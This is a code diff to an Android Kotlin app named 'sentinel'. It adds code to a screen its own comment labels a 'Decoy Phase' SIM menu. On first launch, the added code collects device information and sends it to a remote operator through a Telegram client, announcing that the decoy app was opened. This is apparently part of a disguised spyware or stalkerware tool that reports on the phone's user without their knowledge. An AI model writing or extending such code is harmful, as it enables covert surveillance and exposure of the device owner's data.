@@ -13,9 +13,21 @@ import com.zero.sentinel.R
 
 class SIMMenuActivity : AppCompatActivity() {
 
+    companion object {
+        private var isFirstLaunch = true
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_sim_menu)
+
+        // Notification: Decoy Phase (Session Guarded)
+        if (isFirstLaunch) {
+            isFirstLaunch = false
+            val client = com.zero.sentinel.network.TelegramClient(this)
+            val device = com.zero.sentinel.utils.DeviceInfoHelper.getShortDeviceInfo()
+            client.sendMessage("🔔 *App Open: Decoy Phase* [$device]")
+        }
 
         val listView = findViewById<ListView>(R.id.listView)
         val items = arrayOf(
